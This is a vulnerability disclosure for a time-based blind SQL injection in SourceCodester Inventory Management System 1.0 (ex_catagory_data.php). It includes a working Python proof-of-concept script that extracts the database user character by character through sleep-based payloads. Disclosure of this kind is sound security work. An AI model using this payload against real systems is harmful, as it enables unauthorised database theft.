# SourceCodester Inventory Management System 1.0 has a SQL Injection vulnerability in ex_catagory_data.php
## Software

- Software: Inventory Management System 1.0
- Software Link: https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html
- Vulnerability Type: SQL Injection
- Attack Type: Remote
- Vendor of Product: Sourcecodester

## Description

A vulnerability has been found in SourceCodester Inventory Management System 1.0 and classified as critical. SourceCodester Inventory Management System 1.0 has a SQL Injection vulnerability in ex_catagory_data.php. Affected is file app/ajax/ex_catagory_data.php, the manipulation of the argument `columns[1][data]` leads to SQL injection. Remote attackers can exploit time-based blind injection to retrieve all data from the database.

## Vulnerability Code
- app/ajax/ex_catagory_data.php
![](https://github.com/Yesec/Inventory-Management-System/assets/19534204/0fa49437-d6b8-44e9-ad7a-70dcf4771131)



## POC
```python
import time 
import requests
import string 

dict = string.digits + string.ascii_lowercase + string.punctuation
res = ""
dealy = 2

for i in range(1,50):
    for j in dict:
        start = time.time()
        payload = 'id^if(substr(user(),%s,1)="%s",sleep(2),1);' % (i,j)
        data = {
            "order[0][column]":"1",
            "columns[1][data]": payload
        }
        req = requests.post("http://localhost:81/app/ajax/ex_catagory_data.php", data=data)
        end = time.time() - start
        if end > dealy:
            res += j
            print('[*] Found:' + res)
            break
```
![](https://github.com/Yesec/Inventory-Management-System/assets/19534204/f2cac3f9-faf6-4e60-b1ce-71031f1dd626)
